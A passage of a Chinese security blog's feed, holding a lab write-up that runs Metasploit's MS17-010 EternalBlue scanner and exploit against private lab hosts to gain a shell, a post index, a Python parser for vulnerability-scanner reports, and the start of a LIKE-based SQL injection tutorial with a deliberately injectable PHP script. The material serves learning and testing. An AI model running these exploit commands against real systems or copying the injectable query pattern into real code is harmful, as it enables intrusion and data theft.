class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#利用这个探测模块</span><br><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line"></span><br><span class="line">#设置目标，扫描这个网段</span><br><span class="line">set RHOST 192.168.79.2/24</span><br><span class="line"></span><br><span class="line">#设置线程</span><br><span class="line">set THREADS 3</span><br><span class="line"></span><br><span class="line">#运行</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/2019/10/09/MS17-010漏洞复现/scan.png" alt><br>这里发现了我们的两台windos主机都探测出了漏洞</p><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>使用exploit模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set RHOST 192.168.79.128</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p><p><img src="/2019/10/09/MS17-010漏洞复现/shell.png" alt></p><p>这里我们就拿下目标主机的shell了</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;KALI:192.168.79.130&lt;/li&gt;
&lt;li&gt;WIN7:192.168.79.128&lt;/li&gt;
&lt;li&gt;WIN2008:192.168.79.128&lt;/li&gt;
&lt;li&gt;Msf&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
    
      <category term="主机漏洞" scheme="http://yoursite.com/tags/%E4%B8%BB%E6%9C%BA%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>文章汇总-2019-08-13</title>
    <link href="http://yoursite.com/2019/08/13/summary-2019-08-13/"/>
    <id>http://yoursite.com/2019/08/13/summary-2019-08-13/</id>
    <published>2019-08-13T12:41:45.000Z</published>
    <updated>2019-08-13T13:49:40.000Z</updated>
    
    <content type="html"><![CDATA[<p>各位客官看这里啦，把之前的一些自己认为好的文章放在这个POST里面啦。相信你能在这里找到干货~</p><a id="more"></a><p>信安之路首发文章：<br><a href="https://mp.weixin.qq.com/s/jVN48BRYb9pECjk9SAuXpA" target="_blank" rel="noopener">★聊一聊SQLMAP在进行sql注入时的整个流程</a><br><a href="https://mp.weixin.qq.com/s/HDMCjRSEPfjasR_TRb_j-A" target="_blank" rel="noopener">★熊海CMS代码审计</a></p><p>SQL注入：<br><a href="https://sherlocz.github.io/2019/06/29/sqlmap-p/" target="_blank" rel="noopener">★聊一聊SQLMAP在进行sql注入时的整个流程</a><br><a href="https://sherlocz.github.io/2019/07/01/%E4%B8%80%E6%AC%A1sql%E6%B3%A8%E5%85%A5bypass%E7%9A%84%E6%80%9D%E8%80%83/" target="_blank" rel="noopener">★一次sql注入bypass的思考</a><br><a href="https://sherlocz.github.io/2019/01/18/killsafedog/" target="_blank" rel="noopener">★对安全狗的一次 FUZZ测试</a><br><a href="https://sherlocz.github.io/2019/07/23/%E6%9F%90dog%E7%9A%84%E4%B8%80%E6%9D%A1%E9%BE%99%E6%9C%8D%E5%8A%A1/" target="_blank" rel="noopener">★某dog的一条龙服务</a><br><a href="https://sherlocz.github.io/2019/07/04/%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93sql%E8%AF%AD%E5%8F%A5%E8%BF%87waf/" target="_blank" rel="noopener">★分块传输sql语句过waf</a><br><a href="https://sherlocz.github.io/2019/04/11/mssql-injection/" target="_blank" rel="noopener">对mssql数据库的一次渗透(报错注入)</a><br><a href="https://sherlocz.github.io/2019/04/16/sqlmap-is-dba/" target="_blank" rel="noopener">★sqlmap –is-dba参数解析</a><br><a href="https://sherlocz.github.io/2019/04/17/sqlmap-checkEnvironment/" target="_blank" rel="noopener">sqlmap-checkEnvironment函数解读</a><br><a href="https://sherlocz.github.io/2019/08/07/sql%E6%B3%A8%E5%85%A5%E4%B9%8Blike%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">sql注入之like注入</a></p><p>代码审计：<br><a href="https://sherlocz.github.io/2019/05/16/%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" target="_blank" rel="noopener">★熊海CMS代码审计</a><br><a href="https://sherlocz.github.io/2019/07/22/Discuz-ML-V3-x%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">★Discuz ML V3.x代码注入漏洞分析</a><br><a href="https://sherlocz.github.io/2019/08/01/ucms%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">★ucms系统存在代码注入漏洞的分析</a><br><a href="https://sherlocz.github.io/2019/08/04/zzzphp-V1-6-1-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">★zzzphp V1.6.1 远程代码执行漏洞分析/</a><br><a href="https://sherlocz.github.io/2019/07/05/YxtCMF%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" target="_blank" rel="noopener">YxtCMF后台的注入和getshell分析</a><br><a href="https://sherlocz.github.io/2019/08/06/dedecms-v5-7-sp2%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" target="_blank" rel="noopener">dedecms v5.7 sp2代码执行漏洞复现</a></p><p>爬虫：<br><a href="https://sherlocz.github.io/2019/06/26/58-spider/" target="_blank" rel="noopener">★58爬虫租房信息(半成品)</a><br><a href="https://sherlocz.github.io/2019/01/21/douyin-spider/" target="_blank" rel="noopener">★爬取抖音遇见方形文字的问题</a><br><a href="https://sherlocz.github.io/2019/01/14/butian-spider/" target="_blank" rel="noopener">爬取补天公益厂商</a><br><a href="https://sherlocz.github.io/2019/04/30/zoomeye-api/" target="_blank" rel="noopener">利用zoomeye API获取查询结果</a><br><a href="https://sherlocz.github.io/2019/08/10/%E4%B8%80%E6%AC%A1%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E7%9A%84%E7%88%AC%E8%99%AB/" target="_blank" rel="noopener">一次漏洞扫描的爬虫(半成品)</a></p><p>脚本/工具：<br><a href="https://sherlocz.github.io/2019/01/20/caidao/" target="_blank" rel="noopener">★对菜刀原理的分析</a><br><a href="https://sherlocz.github.io/2019/01/09/github-dis/" target="_blank" rel="noopener">★对一款轻量级Github泄露工具的源码分析</a><br><a href="https://sherlocz.github.io/2019/01/11/subdomainbrute/" target="_blank" rel="noopener">★subdomainbrute源码分析(基础篇)</a><br><a href="https://sherlocz.github.io/2019/01/13/subdomainbrute-2/" target="_blank" rel="noopener">subdomainbrute源码分析(进阶篇)(半成品)</a><br><a href="https://sherlocz.github.io/2019/01/29/change-your-pwd/" target="_blank" rel="noopener">用Python修改小姐姐的电脑密码</a><br><a href="https://sherlocz.github.io/2019/01/13/batch-urls/" target="_blank" rel="noopener">编写脚本对大量url进行处理</a><br><a href="https://sherlocz.github.io/2019/01/17/rename-1000/" target="_blank" rel="noopener">批量修改文件名</a></p><p>翻译：<br><a href="https://sherlocz.github.io/2019/07/12/%E8%AF%91%E6%96%87-MySQL-UDF-Exploitation/" target="_blank" rel="noopener">★译文–MySQL UDF Exploitation</a></p><p>Mail:<a href="mailto:799843458@qq.com" target="_blank" rel="noopener">799843458@qq.com</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;各位客官看这里啦，把之前的一些自己认为好的文章放在这个POST里面啦。相信你能在这里找到干货~&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="汇总" scheme="http://yoursite.com/tags/%E6%B1%87%E6%80%BB/"/>
    
  </entry>
  
  <entry>
    <title>一次漏洞扫描的爬虫</title>
    <link href="http://yoursite.com/2019/08/10/%E4%B8%80%E6%AC%A1%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E7%9A%84%E7%88%AC%E8%99%AB/"/>
    <id>http://yoursite.com/2019/08/10/一次漏洞扫描的爬虫/</id>
    <published>2019-08-10T08:23:36.000Z</published>
    <updated>2019-08-10T14:54:04.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近在写漏洞扫描的报告，要从漏扫工具导出的报告中重新编写一份成公司的报告，但是里面东西太多啦~，让我一个一个复制粘贴整理？No！会python的人绝不手动搞~</p><p>PS：这篇文章没有观赏性，纯粹做一个笔记<br><a id="more"></a></p><h1 id="爬取数据"><a href="#爬取数据" class="headerlink" title="爬取数据"></a>爬取数据</h1><p>用python爬取网站的数据，一般的话就是 requests + bs4，但是问题就来了，本地的文件并不能有requests进行请求，而且bs4生成我们的soup对象的时候，只需要我们的html代码，所以我就直接以文件的形式打开了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">htmlf = open(&apos;C:/Users/Administrator/Desktop/export/Document.html&apos;,&apos;r&apos;)</span><br><span class="line">content = htmlf.read()</span><br></pre></td></tr></table></figure></p><p>这样我们的html代码就复制给content。</p><p>然后在写 soup 抓取数据的时候发现抓取不到、编码问题，尝试了半天不行，就去一个python的群里面去请教了一番。。</p><p><img src="/2019/08/10/一次漏洞扫描的爬虫/1.png" alt><br><img src="/2019/08/10/一次漏洞扫描的爬虫/2.png" alt><br><img src="/2019/08/10/一次漏洞扫描的爬虫/3.png" alt><br><img src="/2019/08/10/一次漏洞扫描的爬虫/4.png" alt></p><p>最后大佬们让我不用bs4了，去用xpath,，就去尝试了一下，哦豁，居然还成了~ 开心</p><p><img src="/2019/08/10/一次漏洞扫描的爬虫/5.png" alt></p><p>思路和bs4都是一样的，先生成一个对象，然后利用对象的方法去获取标签里面的内容，这里直接贴上代码和结果：<br><img src="/2019/08/10/一次漏洞扫描的爬虫/6.png" alt></p><p>这里是源文档里面的内容<br><img src="/2019/08/10/一次漏洞扫描的爬虫/7.png" alt></p><p>既然可以抓取，这里我的几个需求是这样的：<br>文档一：统计每一个ip中高危漏洞、中危漏洞、低危漏洞的数量。<br>文档二：爬取每一个漏洞对应的名称、详情、解决方法、参考、CVE编号、CVSS评分涉及IP。</p><h1 id="文档一：统计漏洞数量"><a href="#文档一：统计漏洞数量" class="headerlink" title="文档一：统计漏洞数量"></a>文档一：统计漏洞数量</h1><p>这里的思路很简单，获取每一个ip中扫描出的漏洞对应的等级，一个for循环，然后i++；</p><p>每一个ip的xpath：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/html/body/div[5]/h2[n]/a/text()</span><br></pre></td></tr></table></figure></p><p>获取ip:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">from lxml import etree</span><br><span class="line"></span><br><span class="line">htmlf = open(&apos;C:/Users/Administrator/Desktop/Document.html&apos;,&apos;r&apos;)</span><br><span class="line">content = htmlf.read()</span><br><span class="line"></span><br><span class="line">html = etree.HTML(content)</span><br><span class="line"># print(html)</span><br><span class="line">for i in range(1,70):</span><br><span class="line">ip_xpath = &quot;/html/body/div[5]/h2[&#123;0&#125;]/a/text()&quot;.format(i)</span><br><span class="line">ip = html.xpath(ip_xpath)</span><br><span class="line">print(ip[0])</span><br></pre></td></tr></table></figure></p><p>每一个ip下漏洞等级对应的xpath：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/html/body/div[5]/div[1]/div[2]/table/tbody/tr[2]/td[3]/p</span><br><span class="line">/html/body/div[5]/div[1]/div[2]/table/tbody/tr[3]/td[3]/p</span><br></pre></td></tr></table></figure></p><p>获取每一个ip下的漏洞等级：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">from lxml import etree</span><br><span class="line"></span><br><span class="line">htmlf = open(&apos;C:/Users/Administrator/Desktop/Document.html&apos;,&apos;r&apos;)</span><br><span class="line">content = htmlf.read()</span><br><span class="line"></span><br><span class="line">html = etree.HTML(content)</span><br><span class="line"># print(html)</span><br><span class="line"></span><br><span class="line">high = 0</span><br><span class="line">mid = 0</span><br><span class="line">low = 0</span><br><span class="line">for i in range(2,1000):</span><br><span class="line">level_xpath = &quot;/html/body/div[5]/div[2]/div[2]/table/tbody/tr[&#123;0&#125;]/td[3]/p/text()&quot;.format(i)</span><br><span class="line">try:</span><br><span class="line">level = html.xpath(level_xpath)</span><br><span class="line">if str(level[0].encode(&apos;unicode-escape&apos;)) == &apos;\u9ad8&apos;:</span><br><span class="line"># print(&apos;high&apos;)</span><br><span class="line">high +=1</span><br><span class="line">elif str(level[0].encode(&apos;unicode-escape&apos;)) == &apos;\u4e2d\u7b49&apos;:</span><br><span class="line"># print(&quot;mid&quot;)</span><br><span class="line">mid +=1</span><br><span class="line">elif str(level[0].encode(&apos;unicode-escape&apos;)) == &apos;\u4f4e&apos;:</span><br><span class="line"># print(&apos;low&apos;)</span><br><span class="line">low +=1</span><br><span class="line">except:</span><br><span class="line">pass</span><br><span class="line"></span><br><span class="line">print(high)</span><br><span class="line">print(mid)</span><br><span class="line">print(low)</span><br></pre></td></tr></table></figure></p><p>然后整合在一起：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">from lxml import etree</span><br><span class="line"></span><br><span class="line">htmlf = open(&apos;C:/Users/Administrator/Desktop/Document.html&apos;,&apos;r&apos;)</span><br><span class="line">content = htmlf.read()</span><br><span class="line"></span><br><span class="line">html = etree.HTML(content)</span><br><span class="line"># print(html)</span><br><span class="line"></span><br><span class="line">ip_list = []</span><br><span class="line"></span><br><span class="line">for i in range(1,70):</span><br><span class="line">ip_xpath = &quot;/html/body/div[5]/h2[&#123;0&#125;]/a/text()&quot;.format(i)</span><br><span class="line">ip = html.xpath(ip_xpath)</span><br><span class="line"># print(ip[0])</span><br><span class="line">ip_list.append(ip[0])</span><br><span class="line"></span><br><span class="line"># print(ip_list)</span><br><span class="line">for i in range(1,70):</span><br><span class="line">high = 0</span><br><span class="line">mid = 0</span><br><span class="line">low = 0</span><br><span class="line">ip = ip_list[i-1]</span><br><span class="line">for m in range(2,200):</span><br><span class="line">level_xpath = &quot;/html/body/div[5]/div[&#123;0&#125;]/div[2]/table/tbody/tr[&#123;1&#125;]/td[3]/p/text()&quot;.format(i,m)</span><br><span class="line"># print(level_xpath)</span><br><span class="line">try:</span><br><span class="line">level = html.xpath(level_xpath)</span><br><span class="line">if str(level[0].encode(&apos;unicode-escape&apos;)) == &apos;\u9ad8&apos;:</span><br><span class="line"># print(&apos;high&apos;)</span><br><span class="line">high +=1</span><br><span class="line">elif str(level[0].encode(&apos;unicode-escape&apos;)) == &apos;\u4e2d\u7b49&apos;:</span><br><span class="line"># print(&quot;mid&quot;)</span><br><span class="line">mid +=1</span><br><span class="line">elif str(level[0].encode(&apos;unicode-escape&apos;)) == &apos;\u4f4e&apos;:</span><br><span class="line"># print(&apos;low&apos;)</span><br><span class="line">low +=1</span><br><span class="line">except:</span><br><span class="line">pass</span><br><span class="line">print(&apos;[+]IP: &#123;3&#125; FOUND [HIGH] &#123;0&#125; [MID] &#123;1&#125; [LOW] &#123;2&#125;&apos;).format(high,mid,low,ip)</span><br></pre></td></tr></table></figure></p><p>原谅我的代码写的垃圾 ==</p><p><img src="/2019/08/10/一次漏洞扫描的爬虫/8.png" alt></p><h1 id="文档二：爬取漏洞相关信息"><a href="#文档二：爬取漏洞相关信息" class="headerlink" title="文档二：爬取漏洞相关信息"></a>文档二：爬取漏洞相关信息</h1><p>漏洞分为 关键漏洞、严重漏洞和中等漏洞。</p><p>没啥说的，直接干：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">#关键漏洞信息脚本，其他两个更换div的节点就行了。</span><br><span class="line">#严重漏洞xpath:</span><br><span class="line">from lxml import etree</span><br><span class="line"></span><br><span class="line">htmlf = open(&apos;C:/Users/Administrator/Desktop/export/Document.html&apos;,&apos;r&apos;)</span><br><span class="line">content = htmlf.read()</span><br><span class="line">html = etree.HTML(content)</span><br><span class="line"></span><br><span class="line">for i in range(1,78):</span><br><span class="line">print(&apos;======================================================================&apos;)</span><br><span class="line">Refer_info = &apos;&apos;</span><br><span class="line">try:</span><br><span class="line">#爬取标题和信息</span><br><span class="line">title_xpath = &apos;/html/body/div[4]/div[1]/h3[&#123;0&#125;]/a/text()&apos;.format(i)</span><br><span class="line">title = html.xpath(title_xpath)</span><br><span class="line">detail_xpath = &apos;/html/body/div[4]/div[1]/div[&#123;0&#125;]/div[1]/p/text()&apos;.format(i)</span><br><span class="line">detail = html.xpath(detail_xpath)</span><br><span class="line">print(&quot;[+]title IN VUL[&#123;0&#125;]&quot;.format(i) + &apos;\r&apos; + title[1].strip())</span><br><span class="line">if detail[0].strip() != &quot;&quot;:</span><br><span class="line">print(&apos;[+]DETAIL IN VUL[&#123;0&#125;]&apos;.format(i) + &apos;\r&apos;+ detail[0].strip())</span><br><span class="line">else:</span><br><span class="line">print(&apos;[+]DETAIL IN VUL[&#123;0&#125;]&apos;.format(i) + &apos;\r&apos;+ detail[1].strip())</span><br><span class="line"></span><br><span class="line">#爬取解决办法</span><br><span class="line">solution_xpath = &apos;/html/body/div[4]/div[1]/div[&#123;0&#125;]/div[4]/p[3]//text()&apos;.format(i)</span><br><span class="line">solution = html.xpath(solution_xpath)</span><br><span class="line">solution_info = &quot;&quot;</span><br><span class="line">for M in range(len(solution)):</span><br><span class="line">solution_info = solution_info + solution[M].strip()</span><br><span class="line">if solution_info.strip() == &quot;&quot;:</span><br><span class="line">solution_xpath = &apos;/html/body/div[4]/div[1]/div[&#123;0&#125;]/div[4]/p[2]//text()&apos;.format(i)</span><br><span class="line">solution = html.xpath(solution_xpath)</span><br><span class="line">solution_info = &quot;&quot;</span><br><span class="line">for M in range(len(solution)):</span><br><span class="line">solution_info = solution_info + solution[M].strip()</span><br><span class="line">if solution_info.strip() == &quot;&quot;:</span><br><span class="line">solution_xpath = &quot;/html/body/div[4]/div[1]/div[&#123;0&#125;]/div[4]/div/ul//text()&quot;.format(i)</span><br><span class="line">solution = html.xpath(solution_xpath)</span><br><span class="line"># print(solution)</span><br><span class="line">solution_info = &quot;&quot;</span><br><span class="line">for M in range(len(solution)):</span><br><span class="line">solution_info = solution_info + solution[M].strip()</span><br><span class="line">print(&apos;[+]SOLUTION IN VUL[&#123;0&#125;]&apos;.format(i) + &apos;\r&apos;+solution_info)</span><br><span class="line">#爬取参考</span><br><span class="line">for j in range(2,100):</span><br><span class="line">try:</span><br><span class="line">refer_xpath = &apos;/html/body/div[4]/div[1]/div[&#123;0&#125;]/div[3]/div/table/tbody/tr[&#123;1&#125;]//text()&apos;.format(i,j)</span><br><span class="line">refer = html.xpath(refer_xpath)</span><br><span class="line">refer_info = refer[2].strip() + &quot;:&quot; + refer[6].strip() + refer[8].strip()</span><br><span class="line">Refer_info = Refer_info + refer_info + &apos;\r&apos;</span><br><span class="line">except:</span><br><span class="line">pass</span><br><span class="line">print(&apos;[+]REFER IN VUL[&#123;0&#125;]&apos;.format(i) + &apos;\r&apos;+Refer_info)</span><br><span class="line">except:</span><br><span class="line">pass</span><br><span class="line"></span><br><span class="line">#爬取节点</span><br><span class="line">print(&apos;[+]NODE IN VUL[&#123;0&#125;]&apos;.format(i))</span><br><span class="line">for j in range(2,100):</span><br><span class="line">try:</span><br><span class="line">node_xpath = &apos;/html/body/div[4]/div[1]/div[&#123;0&#125;]/div[2]/div/table/tbody/tr[&#123;1&#125;]/td[1]/p/text()&apos;.format(i,j)</span><br><span class="line">node = html.xpath(node_xpath)</span><br><span class="line">print(node[0].strip())</span><br><span class="line">except:</span><br><span class="line">pass</span><br></pre></td></tr></table></figure></p><p>严重 漏洞<br>中等 漏洞</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近在写漏洞扫描的报告，要从漏扫工具导出的报告中重新编写一份成公司的报告，但是里面东西太多啦~，让我一个一个复制粘贴整理？No！会python的人绝不手动搞~&lt;/p&gt;
&lt;p&gt;PS：这篇文章没有观赏性，纯粹做一个笔记&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="爬虫" scheme="http://yoursite.com/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>sql注入之like注入</title>
    <link href="http://yoursite.com/2019/08/07/sql%E6%B3%A8%E5%85%A5%E4%B9%8Blike%E6%B3%A8%E5%85%A5/"/>
    <id>http://yoursite.com/2019/08/07/sql注入之like注入/</id>
    <published>2019-08-07T10:39:32.000Z</published>
    <updated>2019-08-07T11:18:06.000Z</updated>
    
    <content type="html"><![CDATA[<p>今天在实战的过程中遇到了一个mssql的数据库，参数提交在了 <strong>like</strong> 后的参数里面，本地测试注入能成功，但是在实战的时候不晓得后端进行了什么处理，没拿下，哎~~</p><p>很烦，写篇博客纪念一下~</p><a id="more"></a><p>like后面的参数可控导致的注入，也没啥花里胡哨的技巧，原理都是互通的，就是注入方式看起来不一样。</p><p>不想搭建mssql+aspx的环境，就简单点搞mysql的吧~</p><p><img src="/2019/08/07/sql注入之like注入/pre.png" alt></p><p>环境：</p><ul><li>phpstudy2014</li><li>php 5.4</li><li>mysql 5.5.40</li></ul><h1 id="脚本准备"><a href="#脚本准备" class="headerlink" title="脚本准备"></a>脚本准备</h1><p>like.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$like = @$_GET[&apos;like&apos;];</span><br><span class="line"></span><br><span class="line">//id没有做 整形转换</span><br><span class="line">if( !isset($like)|| empty($like) )&#123;</span><br><span class="line">    exit(&apos;get.like 参数不能为空&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">try&#123;</span><br><span class="line">    //分别对应的是 地址，端口号，连接的数据库，编码</span><br><span class="line">    $dsn = &quot;mysql:host=127.0.0.1; port=3306; dbname=security; charset=utf8&quot;;</span><br><span class="line"></span><br><span class="line">    //帐号</span><br><span class="line">    $user = &apos;root&apos;;</span><br><span class="line"></span><br><span class="line">    //密码 </span><br><span class="line">    $psw =&apos;root&apos;; </span><br><span class="line"></span><br><span class="line">    //连接到 MySQL</span><br><span class="line">    $pdo = new PDO($dsn,$user,$psw);</span><br><span class="line"></span><br><span class="line">    //准备执行的sql语句  start</span><br><span class="line">    $sql = &quot;select * from users where username like &apos;%$like%&apos;&quot;;</span><br><span class="line">    echo $sql;</span><br><span class="line">    echo &apos;&lt;br/&gt;&apos;;</span><br><span class="line">    //准备执行的sql语句 end</span><br><span class="line">    </span><br><span class="line">    //进行查询数据库出问题则报具体错误</span><br><span class="line">    $res = $pdo-&gt;query($sql) or var_dump($pdo-&gt;errorInfo());</span><br><span class="line"> </span><br><span class="line">    $mon = $res-&gt;fetch(PDO::FETCH_ASSOC);</span><br><span class="line">    print_r( $mon );</span><br><span class="line"></span><br><span class="line">&#125; catch (Exception $e) &#123;</span><br><span class="line">    print $e-&gt;getMessage();</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>security.sql<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span 